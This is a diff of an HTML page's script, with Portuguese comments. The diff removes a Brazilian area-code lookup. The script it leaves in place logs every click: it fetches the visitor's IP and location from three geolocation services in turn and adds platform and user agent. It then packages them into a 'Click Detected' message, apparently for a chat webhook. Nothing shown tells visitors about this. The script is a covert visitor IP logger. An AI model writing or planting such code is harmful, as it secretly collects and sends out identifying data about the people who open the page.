@@ -169,17 +169,6 @@
 </div>
 
 <script>
-    // Dicionário de DDDs
-    const mapDDD = {
-        "AC": "68", "AL": "82", "AP": "96", "AM": "92, 97", "BA": "71, 73, 74, 75, 77",
-        "CE": "85, 88", "DF": "61", "ES": "27, 28", "GO": "62, 64", "MA": "98, 99",
-        "MT": "65, 66", "MS": "67", "MG": "31, 32, 33, 34, 35, 37, 38",
-        "PA": "91, 93, 94", "PB": "83", "PR": "41, 42, 43, 44, 45, 46",
-        "PE": "81, 87", "PI": "86, 89", "RJ": "21, 22, 24", "RN": "84",
-        "RS": "51, 53, 54, 55", "RO": "69", "RR": "95", "SC": "47, 48, 49",
-        "SP": "11 a 19", "SE": "79", "TO": "63"
-    };
-
     // Tradutor de Nome de Estado para Sigla
     const mapUF = {
         "Acre": "AC", "Alagoas": "AL", "Amapa": "AP", "Amapá": "AP", "Amazonas": "AM",
@@ -210,11 +199,10 @@
         let ip = "Não identificado";
         let cidade = "Desconhecida";
         let estado = "??";
-        let ddd = "Desconhecido";
 
         // CASCATA DE APIS: Se uma falhar, pula pra outra automaticamente
         try {
-            // TENTATIVA 1: ipinfo.io (Extremamente estável, raro de ser bloqueada)
+            // TENTATIVA 1: ipinfo.io
             const r1 = await fetch('https://ipinfo.io/json');
             const d1 = await r1.json();
             ip = d1.ip; 
@@ -222,7 +210,7 @@
             estado = getUF(d1.region);
         } catch (e1) {
             try {
-                // TENTATIVA 2: db-ip (Excelente alternativa)
+                // TENTATIVA 2: db-ip
                 const r2 = await fetch('https://api.db-ip.com/v2/free/self');
                 const d2 = await r2.json();
                 ip = d2.ipAddress; 
@@ -230,7 +218,7 @@
                 estado = getUF(d2.stateProv);
             } catch (e2) {
                 try {
-                    // TENTATIVA 3: ipwhois (A que tentamos antes)
+                    // TENTATIVA 3: ipwhois
                     const r3 = await fetch('https://ipwhois.app/json/');
                     const d3 = await r3.json();
                     ip = d3.ip; 
@@ -247,9 +235,6 @@
             }
         }
 
-        // Tenta achar o DDD baseado na sigla do estado retornada
-        ddd = mapDDD[estado] || "Não encontrado";
-
         const message = {
             embeds: [{
                 title: "🚨 Clique Detectado",
@@ -258,7 +243,6 @@
                     { name: "Opção Acessada", value: itemName, inline: true },
                     { name: "IP do Usuário", value: ip, inline: true },
                     { name: "Localização", value: `${cidade} - ${estado}`, inline: true },
-                    { name: "DDD da Região", value: ddd, inline: true },
                     { name: "Plataforma", value: navigator.platform, inline: true },
                     { name: "User-Agent", value: navigator.userAgent, inline: false }
                 ],
@@ -284,5 +268,3 @@
         }
     }
 </script>
-</body>
-</html>
